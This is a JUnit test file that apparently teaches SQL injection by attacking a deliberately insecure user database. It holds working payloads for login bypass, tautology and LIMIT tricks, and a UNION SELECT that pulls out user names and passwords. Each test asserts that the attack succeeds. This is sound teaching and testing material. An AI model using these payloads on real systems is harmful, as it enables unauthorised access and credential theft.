package sqlinjection.insecuredb.stringfield;

import org.junit.jupiter.api.Assertions;
import org.junit.jupiter.api.BeforeAll;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.Arguments;
import org.junit.jupiter.params.provider.MethodSource;
import sqlinjection.insecuredb.DbApi;
import sqlinjection.tododb.MyDB;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.stream.Stream;

class SelectStringSQLInjectionsTest {

    /* examples of what SQL Injection is capable of */

    DbApi myDB;

    @BeforeEach
    void setupDB(){
        myDB = new DbApi(new MyDB().create());
    }

    static Stream usernamePasswords() {
        List<Arguments> args = new ArrayList<>();

        // username, password, explanation
        args.add(Arguments.of("admin'-- ", "",
                            "I know a username, bypass password"));
        args.add(Arguments.of("' or 1=1 FETCH FIRST 1 ROWS ONLY-- ", "",
                            "Do not know any user names"));
        args.add(Arguments.of("' or true LIMIT 1-- ", "",
                            "Do not know any user names again"));
        args.add(Arguments.of("", "' or password='root",
                            "I know a password"));
        args.add(Arguments.of("' UNION SELECT name || '~' || password as description from users LIMIT 1--", "",
                        "bypass login and tell the the user name and password to make it easier next time"));

        return args.stream();
    }

    @ParameterizedTest(name = "login bypass username:\"{0}\" and password: \"{1}\" - ({2})")
    @MethodSource("usernamePasswords")
    void loginBypass(String username, String password, String explanation) {

        System.out.println(explanation);
        List<String> users = myDB.getUserLoggedIn(username, password);

        Assertions.assertEquals(1, users.size());
        System.out.println("Logged in as " + users.get(0));
    }


    static Stream userDetailsInjection() {
        List<Arguments> args = new ArrayList<>();

        // username, password, explanation
        args.add(Arguments.of("' or 1=1 -- ", Integer.valueOf(2),
                "Get all users"));
        args.add(Arguments.of("' or name LIKE '%admin' -- ", Integer.valueOf(1),
                "Do not know any user names"));
        return args.stream();
    }

    @ParameterizedTest(name = "get user where name= {0} {1} - ({2})")
    @MethodSource("userDetailsInjection")
    void getUserDetails(String userDetails, Integer minimum, String explanation) {

        System.out.println(explanation);
        List<Map<String, Object>> details = myDB.getUserDetails(userDetails);

        myDB.printMap(details);

        Assertions.assertTrue(details.size() >= minimum.intValue(), "Expected to get more details");
    }

    static Stream adminUserDetails() {
        List<Arguments> args = new ArrayList<>();

        args.add(Arguments.of("' or name LIKE '%admin%'-- ",
                "Assume admin user has 'admin' in their name"));
        return args.stream();
    }

    @ParameterizedTest(name = "get admin user where name='{0}' - ({1})")
    @MethodSource("adminUserDetails")
    void getAdminUserDetails(String userDetails, String explanation) {

        System.out.println(explanation);
        List<Map<String, Object>> details = myDB.getUserDetails(userDetails);

        myDB.printMap(details);

        Assertions.assertEquals("admin", details.get(0).get("NAME") );
        Assertions.assertEquals(1, details.size());
    }


}
